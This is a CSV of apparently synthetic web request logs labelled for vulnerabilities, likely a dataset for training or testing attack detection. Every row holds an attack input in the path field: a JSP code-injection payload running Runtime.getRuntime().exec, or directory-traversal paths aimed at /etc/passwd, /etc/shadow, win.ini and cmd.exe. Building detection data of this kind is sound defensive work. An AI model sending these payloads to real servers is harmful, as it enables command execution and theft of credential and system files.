ClientIP,ClientRequestHost,ClientRequestMethod,ClientRequestURI,EdgeStartTimestamp,ZoneName,ClientASN,ClientCountry,ClientDeviceType,ClientSrcPort,ClientRequestBytes,ClientRequestPath,ClientRequestReferer,ClientRequestScheme,ClientRequestUserAgent,IsVulnerable,Vulnerabilities
113.19.13.53,moore.com,GET,/serious/she/drive,2024-11-10 16:42:37+00:00,infinitepay.io,396982,us,desktop,48870,6503,"/eval?param=<%=Runtime.getRuntime().exec(""calc.exe"")%>",http://www.hernandez.com/,https,"Mozilla/5.0 (Windows; U; Windows 98; Win 9x 4.90) AppleWebKit/532.50.2 (KHTML, like Gecko) Version/4.0.3 Safari/532.50.2",True,"Code Execution, Code Injection, Special Characters"
102.145.201.152,porter.biz,GET,/want/think/event,2024-11-11 20:28:24+00:00,infinitepay.io,22085,in,desktop,45729,4075,"/eval?param=<%=Runtime.getRuntime().exec(""calc.exe"")%>",http://www.hernandez.com/,https,"Mozilla/5.0 (Windows; U; Windows 98; Win 9x 4.90) AppleWebKit/532.50.2 (KHTML, like Gecko) Version/4.0.3 Safari/532.50.2",True,"Code Execution, Code Injection, Special Characters"
129.250.178.34,kirby.info,POST,/write/toward/story,2024-11-11 13:40:42+00:00,infinitepay.io,396982,us,desktop,53672,4684,"/eval?param=<%=Runtime.getRuntime().exec(""calc.exe"")%>",http://www.hernandez.com/,https,"Mozilla/5.0 (Windows NT 5.2) AppleWebKit/535.0 (KHTML, like Gecko) Chrome/25.0.815.0 Safari/535.0",True,"Code Execution, Code Injection, Special Characters"
1b3c:ab01:d7db:9067:706a:4305:a837:82c1,walters-thompson.com,GET,/remain/position/street/door,2024-11-14 12:31:25+00:00,infinitepay.io,22085,in,mobile,40253,4637,"/eval?param=<%=Runtime.getRuntime().exec(""calc.exe"")%>",http://www.owens.com/,https,Mozilla/5.0 (compatible; MSIE 8.0; Windows NT 5.0; Trident/4.1),True,"Code Execution, Code Injection, Special Characters"
43.176.164.150,porter.biz,GET,/brother/wide,2024-11-14 02:47:12+00:00,infinitepay.io,271333,in,tablet,10592,4130,"/eval?param=<%=Runtime.getRuntime().exec(""calc.exe"")%>",http://www.hernandez.com/,https,Opera/8.24.(X11; Linux i686; raj-IN) Presto/2.9.170 Version/12.00,True,"Code Execution, Code Injection, Special Characters"
bfc2:e9a4:71f0:9274:9feb:82a1:16f3:3a49,porter.biz,GET,/piece/statement/common/Mrs,2024-11-08 21:11:48+00:00,infinitepay.io,28158,in,desktop,64255,3504,"/eval?param=<%=Runtime.getRuntime().exec(""calc.exe"")%>",http://www.hernandez.com/,https,"Mozilla/5.0 (Windows; U; Windows 98; Win 9x 4.90) AppleWebKit/532.50.2 (KHTML, like Gecko) Version/4.0.3 Safari/532.50.2",True,"Code Execution, Code Injection, Special Characters"
83.209.73.10,acosta.com,GET,/whom/ever/box/nothing,2024-11-08 05:11:09+00:00,infinitepay.io,396982,us,tablet,54122,5225,"/eval?param=<%=Runtime.getRuntime().exec(""calc.exe"")%>",http://www.hernandez.com/,https,Mozilla/5.0 (Windows 98; mni-IN; rv:1.9.2.20) Gecko/7235-07-04 22:11:05.287994 Firefox/3.6.16,True,"Code Execution, Code Injection, Special Characters"
61.54.40.181,walters-thompson.com,GET,/threat/black,2024-11-09 10:00:44+00:00,infinitepay.io,269700,in,mobile,26058,4897,"/eval?param=<%=Runtime.getRuntime().exec(""calc.exe"")%>",http://www.owens.com/,https,Mozilla/5.0 (compatible; MSIE 8.0; Windows NT 11.0; Trident/4.1),True,"Code Execution, Code Injection, Special Characters"
200.51.13.20,joseph.org,POST,/sound/explain/suggest,2024-11-06 23:27:47+00:00,infinitepay.io,26615,in,desktop,45693,3560,"/eval?param=<%=Runtime.getRuntime().exec(""calc.exe"")%>",https://www.rogers.com/,https,"Mozilla/5.0 (Windows; U; Windows 98; Win 9x 4.90) AppleWebKit/532.50.2 (KHTML, like Gecko) Version/4.0.3 Safari/532.50.2",True,"Code Execution, Code Injection, Special Characters"
144.43.7.43,brown.net,GET,/want/media/street,2024-11-10 05:04:08+00:00,infinitepay.io,396982,us,tablet,38472,6510,/../../../windows/win.ini,http://www.hernandez.com/,https,Mozilla/5.0 (Windows 98; mni-IN; rv:1.9.2.20) Gecko/7235-07-04 22:11:05.287994 Firefox/3.6.16,True,"Directory Traversal, Special Characters"
11.163.106.243,pruitt.com,GET,/top/page/interview,2024-11-13 09:17:28+00:00,infinitepay.io,63949,us,desktop,50786,3410,/../../boot.ini,http://www.hernandez.com/,https,Opera/9.54.(X11; Linux i686; hi-IN) Presto/2.9.173 Version/10.00,True,"Directory Traversal, Special Characters"
105.87.114.27,porter.biz,GET,/third/through,2024-11-12 00:10:00+00:00,infinitepay.io,28126,in,mobile,45184,2781,/../../boot.ini,http://www.hernandez.com/,https,"Mozilla/5.0 (iPod; U; CPU iPhone OS 3_2 like Mac OS X; eu-FR) AppleWebKit/532.20.4 (KHTML, like Gecko) Version/3.0.5 Mobile/8B116 Safari/6532.20.4",True,"Directory Traversal, Special Characters"
19.143.51.102,pearson.com,GET,/want/think/event,2024-11-10 03:05:41+00:00,infinitepay.io,396982,us,desktop,60288,5340,/../../boot.ini,http://www.hernandez.com/,https,"Mozilla/5.0 (Windows; U; Windows 98; Win 9x 4.90) AppleWebKit/532.50.2 (KHTML, like Gecko) Version/4.0.3 Safari/532.50.2",True,"Directory Traversal, Special Characters"
128.3.125.57,acosta.com,GET,/whom/ever/box/nothing,2024-11-07 19:47:23+00:00,infinitepay.io,396982,us,tablet,39284,6481,/../../../windows/win.ini,http://www.hernandez.com/,https,Mozilla/5.0 (compatible; MSIE 5.0; Windows NT 4.0; Trident/4.0),True,"Directory Traversal, Special Characters"
146.239.91.195,brown.net,GET,/open/together/scene,2024-11-10 00:01:37+00:00,infinitepay.io,396982,us,tablet,32840,6693,/../../../etc/passwd,http://www.hernandez.com/,https,"Mozilla/5.0 (Linux; Android 4.0.2) AppleWebKit/535.0 (KHTML, like Gecko) Chrome/33.0.890.0 Safari/535.0",True,"Directory Traversal, Special Characters"
181.37.150.112,acosta.com,GET,/authority,2024-11-12 19:10:48+00:00,infinitepay.io,396982,us,tablet,58264,6399,/../../../windows/win.ini,https://www.mercado.info/,https,"Mozilla/5.0 (Macintosh; U; PPC Mac OS X 10_12_4) AppleWebKit/535.2 (KHTML, like Gecko) Chrome/19.0.878.0 Safari/535.2",True,"Directory Traversal, Special Characters"
88.21.242.189,porter.biz,GET,/want/media/street,2024-11-08 21:20:59+00:00,infinitepay.io,26615,in,desktop,11272,3455,/../../../windows/win.ini,http://stevens-johnson.com/,https,Mozilla/5.0 (X11; Linux i686; rv:1.9.6.20) Gecko/4321-07-10 03:07:39.458618 Firefox/12.0,True,"Directory Traversal, Special Characters"
96.152.27.237,pearson.com,GET,/itself/return,2024-11-13 11:32:11+00:00,infinitepay.io,396982,us,tablet,46298,5232,/../../../windows/win.ini,http://www.hernandez.com/,https,"Mozilla/5.0 (iPhone; CPU iPhone OS 12_5_7 like Mac OS X) AppleWebKit/535.2 (KHTML, like Gecko) FxiOS/9.3p8500.0 Mobile/34U137 Safari/535.2",True,"Directory Traversal, Special Characters"
139.88.106.5,brown.net,GET,/bar/simple/bag,2024-11-12 21:05:40+00:00,infinitepay.io,396982,us,desktop,60172,6453,/../../boot.ini,http://www.hernandez.com/,https,"Mozilla/5.0 (Windows; U; Windows NT 5.01) AppleWebKit/535.37.2 (KHTML, like Gecko) Version/4.0 Safari/535.37.2",True,"Directory Traversal, Special Characters"
185.24.37.122,acosta.com,GET,/whom/ever/box/nothing,2024-11-07 21:01:30+00:00,infinitepay.io,396982,us,tablet,38174,6528,/../../../../windows/system32/cmd.exe,http://www.hernandez.com/,https,Mozilla/5.0 (Android 2.3.2; Mobile; rv:51.0) Gecko/51.0 Firefox/51.0,True,"Directory Traversal, Special Characters"
b270:814c:f4c1:c9ee:d79:ff30:b8a8:d0b5,joseph.org,POST,/detail,2024-11-12 02:20:56+00:00,infinitepay.io,263292,in,tablet,47488,3273,/../../../etc/passwd,http://www.hernandez.com/,https,"Mozilla/5.0 (Windows; U; Windows NT 5.1) AppleWebKit/534.33.2 (KHTML, like Gecko) Version/5.0.1 Safari/534.33.2",True,"Directory Traversal, Special Characters"
195.171.155.166,acosta.com,GET,/authority,2024-11-10 13:32:41+00:00,infinitepay.io,396982,us,tablet,41966,6320,/../../../etc/passwd,http://www.hernandez.com/,https,"Mozilla/5.0 (Linux; Android 4.0.2) AppleWebKit/535.0 (KHTML, like Gecko) Chrome/33.0.890.0 Safari/535.0",True,"Directory Traversal, Special Characters"
107.176.167.237,turner-blevins.biz,GET,/class/change/respond,2024-11-14 22:31:03+00:00,infinitepay.io,63949,us,desktop,54382,4074,/../../../windows/win.ini,https://fernandez.com/,https,Mozilla/5.0 (Android 4.2; Mobile; rv:6.0) Gecko/6.0 Firefox/6.0,True,"Directory Traversal, Special Characters"
178.176.31.6,brown.net,POST,/street,2024-11-14 16:26:28+00:00,infinitepay.io,396982,us,tablet,37698,14266,/../../../etc/passwd,http://www.hernandez.com/,https,"Mozilla/5.0 (iPhone; CPU iPhone OS 12_5_7 like Mac OS X) AppleWebKit/535.2 (KHTML, like Gecko) FxiOS/9.3p8500.0 Mobile/34U137 Safari/535.2",True,"Directory Traversal, Special Characters"
115.195.224.162,acosta.com,GET,/program/leader/box,2024-11-14 02:11:52+00:00,infinitepay.io,396982,us,desktop,52980,5948,/../../boot.ini,http://www.hernandez.com/,https,"Mozilla/5.0 (iPod; U; CPU iPhone OS 4_3 like Mac OS X; cs-CZ) AppleWebKit/533.22.7 (KHTML, like Gecko) Version/4.0.5 Mobile/8B114 Safari/6533.22.7",True,"Directory Traversal, Special Characters"
188.101.116.213,joseph.org,POST,/business/big/seven,2024-11-11 16:40:41+00:00,infinitepay.io,28573,in,desktop,53796,4015,/../../../../../../../../../../etc/shadow,http://www.hernandez.com/,https,"Mozilla/5.0 (Windows; U; Windows 98; Win 9x 4.90) AppleWebKit/532.50.2 (KHTML, like Gecko) Version/4.0.3 Safari/532.50.2",True,"Directory Traversal, Special Characters"
197.186.169.178,brown.net,GET,/clear,2024-11-08 14:46:33+00:00,infinitepay.io,396982,us,desktop,42364,6606,/../../boot.ini,http://www.hernandez.com/,https,"Mozilla/5.0 (Windows; U; Windows 98; Win 9x 4.90) AppleWebKit/532.50.2 (KHTML, like Gecko) Version/4.0.3 Safari/532.50.2",True,"Directory Traversal, Special Characters"
66.170.211.253,acosta.com,GET,/authority,2024-11-10 02:00:31+00:00,infinitepay.io,396982,us,tablet,46140,6432,/../../../windows/win.ini,http://www.hernandez.com/,https,Mozilla/5.0 (compatible; MSIE 5.0; Windows NT 6.1; Trident/4.1),True,"Directory Traversal, Special Characters"
112.37.23.106,porter.biz,GET,/move/free/artist/believe,2024-11-14 11:32:22+00:00,infinitepay.io,262459,in,desktop,30611,2330,/../../../../windows/system32/cmd.exe,http://www.hernandez.com/,https,"Mozilla/5.0 (Windows 98) AppleWebKit/533.0 (KHTML, like Gecko) Chrome/34.0.803.0 Safari/533.0",True,"Directory Traversal, Special Characters"
199.105.97.37,joseph.org,POST,/business/big/seven,2024-11-11 12:57:27+00:00,infinitepay.io,28573,in,desktop,8892,4038,/../../../../windows/system32/cmd.exe,http://www.hernandez.com/,https,"Mozilla/5.0 (Macintosh; U; PPC Mac OS X 10_11_3) AppleWebKit/536.1 (KHTML, like Gecko) Chrome/63.0.818.0 Safari/536.1",True,"Directory Traversal, Special Characters"
172.230.59.15,porter.biz,GET,/want/think/event,2024-11-08 13:59:44+00:00,infinitepay.io,271647,in,desktop,53575,4068,/../../../../../../../../../../etc/shadow,http://www.hernandez.com/,https,"Mozilla/5.0 (Windows; U; Windows 98; Win 9x 4.90) AppleWebKit/532.50.2 (KHTML, like Gecko) Version/4.0.3 Safari/532.50.2",True,"Directory Traversal, Special Characters"
136.212.254.50,marshall-odonnell.net,GET,/prepare/process,2024-11-12 11:44:28+00:00,infinitepay.io,263292,in,desktop,51136,6537,/../../../../windows/system32/cmd.exe,http://johnson.org/,https,Opera/9.21.(X11; Linux i686; gd-GB) Presto/2.9.186 Version/10.00,True,"Directory Traversal, Special Characters"
215.72.87.11,brown.net,POST,/street,2024-11-09 19:59:36+00:00,infinitepay.io,396982,us,tablet,51412,11507,/../../../../../../../../../../etc/shadow,http://www.hernandez.com/,https,Mozilla/5.0 (Windows 98; mni-IN; rv:1.9.2.20) Gecko/7235-07-04 22:11:05.287994 Firefox/3.6.16,True,"Directory Traversal, Special Characters"
164.197.75.4,powell.info,POST,/view,2024-11-12 14:18:38+00:00,infinitepay.io,264106,in,desktop,63902,4242,/../../../etc/passwd,http://www.hernandez.com/,https,"Mozilla/5.0 (Linux; Android 12) AppleWebKit/535.1 (KHTML, like Gecko) Chrome/25.0.897.0 Safari/535.1",True,"Directory Traversal, Special Characters"
9942:a679:863d:fd01:8708:4441:bc8a:7847,porter.biz,GET,/want/media/street,2024-11-08 10:38:32+00:00,infinitepay.io,264075,in,tablet,44838,4098,/../../../../../../../../../../etc/shadow,http://www.hernandez.com/,https,"Mozilla/5.0 (Linux; Android 4.0.2) AppleWebKit/535.0 (KHTML, like Gecko) Chrome/33.0.890.0 Safari/535.0",True,"Directory Traversal, Special Characters"
211.171.187.12,porter.biz,GET,/from/expert/others,2024-11-12 14:20:53+00:00,infinitepay.io,7738,in,mobile,47740,2804,/../../../../../../../../../../etc/shadow,http://www.hernandez.com/,https,"Mozilla/5.0 (iPod; U; CPU iPhone OS 3_2 like Mac OS X; eu-FR) AppleWebKit/532.20.4 (KHTML, like Gecko) Version/3.0.5 Mobile/8B116 Safari/6532.20.4",True,"Directory Traversal, Special Characters"
45.123.100.111,porter.biz,GET,/want/media/street,2024-11-08 21:44:48+00:00,infinitepay.io,268255,in,desktop,57242,3462,/../../../../windows/system32/cmd.exe,http://www.hernandez.com/,https,Mozilla/5.0 (compatible; MSIE 5.0; Windows NT 5.01; Trident/5.0),True,"Directory Traversal, Special Characters"
171.76.104.123,guerrero.biz,GET,/grow/strong/never/project,2024-11-12 14:32:03+00:00,infinitepay.io,396982,in,desktop,3333,3644,/../../boot.ini,http://www.hernandez.com/,https,"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/536.0 (KHTML, like Gecko) Chrome/52.0.813.0 Safari/536.0",True,"Directory Traversal, Special Characters"
6e87:49bf:cbcd:fb1c:cef1:e0b9:ea38:d9f5,walters-thompson.com,GET,/another/employee,2024-11-13 15:25:50+00:00,infinitepay.io,262391,in,mobile,40922,5292,/../../boot.ini,http://www.owens.com/,https,Mozilla/5.0 (X11; Linux i686; rv:1.9.6.20) Gecko/3973-11-25 18:35:39.241829 Firefox/13.0,True,"Directory Traversal, Special Characters"
757f:b743:a5fb:b54c:7cdb:ba87:c5a9:71d,carrillo-nelson.net,GET,/decade/throw/human,2024-11-12 13:34:52+00:00,infinitepay.io,263151,in,mobile,58312,2988,/../../../../../../../../../../etc/shadow,http://garcia.com/,https,Mozilla/5.0 (Android 2.3.5; Mobile; rv:61.0) Gecko/61.0 Firefox/61.0,True,"Directory Traversal, Special Characters"
14.227.188.198,acosta.com,GET,/president,2024-11-12 02:11:24+00:00,infinitepay.io,396982,us,tablet,38916,6409,/../../../windows/win.ini,https://montoya-smith.com/,https,"Mozilla/5.0 (Macintosh; U; PPC Mac OS X 10_12_4) AppleWebKit/535.2 (KHTML, like Gecko) Chrome/19.0.878.0 Safari/535.2",True,"Directory Traversal, Special Characters"
190.49.173.223,jackson.com,POST,/number/between/enough/late,2024-11-13 20:15:29+00:00,infinitepay.io,396982,in,desktop,36146,4538,/../../../windows/win.ini,http://www.hernandez.com/,https,Opera/8.79.(X11; Linux i686; kw-GB) Presto/2.9.184 Version/12.00,True,"Directory Traversal, Special Characters"
196.16.189.185,porter.biz,GET,/want/media/street,2024-11-06 00:47:36+00:00,infinitepay.io,4230,in,desktop,59477,3426,/../../../etc/passwd,http://www.hernandez.com/,https,"Mozilla/5.0 (iPod; U; CPU iPhone OS 3_2 like Mac OS X; fi-FI) AppleWebKit/533.14.3 (KHTML, like Gecko) Version/3.0.5 Mobile/8B118 Safari/6533.14.3",True,"Directory Traversal, Special Characters"
163.129.97.127,vaughan-ryan.org,GET,/last/perform,2024-11-12 10:11:52+00:00,infinitepay.io,265234,in,mobile,38176,3743,/../../../etc/passwd,http://www.hernandez.com/,https,"Mozilla/5.0 (iPod; U; CPU iPhone OS 3_0 like Mac OS X; ayc-PE) AppleWebKit/532.36.1 (KHTML, like Gecko) Version/3.0.5 Mobile/8B119 Safari/6532.36.1",True,"Directory Traversal, Special Characters"
210.28.248.213,porter.biz,GET,/apply,2024-11-13 11:43:18+00:00,infinitepay.io,262282,in,tablet,15931,3886,/../../../../windows/system32/cmd.exe,http://www.hernandez.com/,https,Mozilla/5.0 (Windows 98; mni-IN; rv:1.9.2.20) Gecko/7235-07-04 22:11:05.287994 Firefox/3.6.16,True,"Directory Traversal, Special Characters"
6c97:cd33:14a:fe10:e3c:d71:cf67:4a4f,porter.biz,GET,/later,2024-11-09 14:12:33+00:00,infinitepay.io,263152,in,mobile,36092,2819,/../../../etc/passwd,http://www.hernandez.com/,https,Mozilla/5.0 (compatible; MSIE 8.0; Windows NT 6.0; Trident/3.0),True,"Directory Traversal, Special Characters"
57.175.122.246,brown.net,GET,/want/media/street,2024-11-06 20:38:05+00:00,infinitepay.io,396982,us,desktop,59334,6516,/../../../windows/win.ini,http://www.hernandez.com/,https,"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/531.0 (KHTML, like Gecko) Chrome/50.0.852.0 Safari/531.0",True,"Directory Traversal, Special Characters"
125.127.182.123,porter.biz,GET,/middle,2024-11-14 22:11:21+00:00,infinitepay.io,271419,in,tablet,4812,3886,/../../../windows/win.ini,http://www.hernandez.com/,https,Mozilla/5.0 (compatible; MSIE 7.0; Windows 98; Win 9x 4.90; Trident/4.0),True,"Directory Traversal, Special Characters"
88.190.191.62,brown.net,GET,/offer,2024-11-07 13:21:57+00:00,infinitepay.io,396982,us,desktop,36892,6574,/../../../etc/passwd,http://www.hernandez.com/,https,"Mozilla/5.0 (iPod; U; CPU iPhone OS 3_2 like Mac OS X; fi-FI) AppleWebKit/533.14.3 (KHTML, like Gecko) Version/3.0.5 Mobile/8B118 Safari/6533.14.3",True,"Directory Traversal, Special Characters"
137.127.11.174,porter.biz,GET,/money/official,2024-11-09 18:36:39+00:00,infinitepay.io,268514,in,tablet,18278,4083,/../../../etc/passwd,http://www.hernandez.com/,https,"Mozilla/5.0 (iPhone; CPU iPhone OS 16_7_7 like Mac OS X) AppleWebKit/532.1 (KHTML, like Gecko) FxiOS/17.5q9882.0 Mobile/77C565 Safari/532.1",True,"Directory Traversal, Special Characters"
89.240.61.108,jackson.com,GET,/story/fine/rather,2024-11-09 12:41:55+00:00,infinitepay.io,396982,us,tablet,37770,5358,/../../../../../../../../../../etc/shadow,http://www.hernandez.com/,https,"Mozilla/5.0 (Macintosh; U; PPC Mac OS X 10_12_4) AppleWebKit/535.2 (KHTML, like Gecko) Chrome/19.0.878.0 Safari/535.2",True,"Directory Traversal, Special Characters"
89.236.176.154,brown.net,GET,/want/media/street,2024-11-07 01:22:12+00:00,infinitepay.io,396982,us,tablet,34362,6583,/../../../../windows/system32/cmd.exe,http://www.hernandez.com/,https,Mozilla/5.0 (Windows 98; mni-IN; rv:1.9.2.20) Gecko/7235-07-04 22:11:05.287994 Firefox/3.6.16,True,"Directory Traversal, Special Characters"
10.228.210.2,porter.biz,POST,/low/that/deal,2024-11-09 23:20:51+00:00,infinitepay.io,16735,in,mobile,56542,3737,/../../../etc/passwd,http://www.hernandez.com/,https,"Mozilla/5.0 (iPod; U; CPU iPhone OS 3_2 like Mac OS X; eu-FR) AppleWebKit/532.20.4 (KHTML, like Gecko) Version/3.0.5 Mobile/8B116 Safari/6532.20.4",True,"Directory Traversal, Special Characters"
210.64.75.203,porter.biz,GET,/my,2024-11-07 14:33:01+00:00,infinitepay.io,26599,in,desktop,35924,3506,/../../boot.ini,http://www.thomas.biz/,https,Opera/8.32.(X11; Linux i686; os-RU) Presto/2.9.187 Version/10.00,True,"Directory Traversal, Special Characters"
7.113.8.157,pearson.com,GET,/task/green/account,2024-11-09 03:07:08+00:00,infinitepay.io,396982,us,tablet,57414,5239,/../../../../windows/system32/cmd.exe,http://www.hernandez.com/,https,"Mozilla/5.0 (Macintosh; U; PPC Mac OS X 10_12_4) AppleWebKit/535.2 (KHTML, like Gecko) Chrome/19.0.878.0 Safari/535.2",True,"Directory Traversal, Special Characters"
32.168.224.172,rowe-montgomery.com,PATCH,/each/agree,2024-11-13 21:02:12+00:00,infinitepay.io,396982,us,desktop,57584,4619,/../../../../windows/system32/cmd.exe,http://www.hernandez.com/,https,"Mozilla/5.0 (Windows; U; Windows NT 5.01) AppleWebKit/535.2.5 (KHTML, like Gecko) Version/4.0.1 Safari/535.2.5",True,"Directory Traversal, Special Characters"
171.26.169.53,porter.biz,GET,/want/think/event,2024-11-10 18:05:23+00:00,infinitepay.io,264948,in,desktop,44251,3458,/../../boot.ini,http://www.hernandez.com/,https,"Mozilla/5.0 (Windows; U; Windows 98; Win 9x 4.90) AppleWebKit/532.50.2 (KHTML, like Gecko) Version/4.0.3 Safari/532.50.2",True,"Directory Traversal, Special Characters"
d10e:460e:b24a:e0be:fc59:e497:8b6c:9e3d,mason.com,GET,/serve/money/eye,2024-11-09 00:06:25+00:00,infinitepay.io,13335,us,desktop,55866,5379,/../../../etc/passwd,http://johnson.org/,https,"Mozilla/5.0 (iPhone; CPU iPhone OS 6_1_6 like Mac OS X) AppleWebKit/536.1 (KHTML, like Gecko) FxiOS/11.6d8322.0 Mobile/11C387 Safari/536.1",True,"Directory Traversal, Special Characters"
157.226.241.234,brown.net,GET,/want/media/street,2024-11-11 15:53:24+00:00,infinitepay.io,396982,us,tablet,44590,6429,/../../../etc/passwd,http://www.hernandez.com/,https,Mozilla/5.0 (Windows 98; mni-IN; rv:1.9.2.20) Gecko/7235-07-04 22:11:05.287994 Firefox/3.6.16,True,"Directory Traversal, Special Characters"
1fbe:d264:f863:2f7d:ba24:4fea:3510:3b35,porter.biz,GET,/middle,2024-11-14 18:41:53+00:00,infinitepay.io,7738,in,tablet,57002,3958,/../../../../windows/system32/cmd.exe,http://www.hernandez.com/,https,Mozilla/5.0 (compatible; MSIE 6.0; Windows 98; Trident/4.0),True,"Directory Traversal, Special Characters"
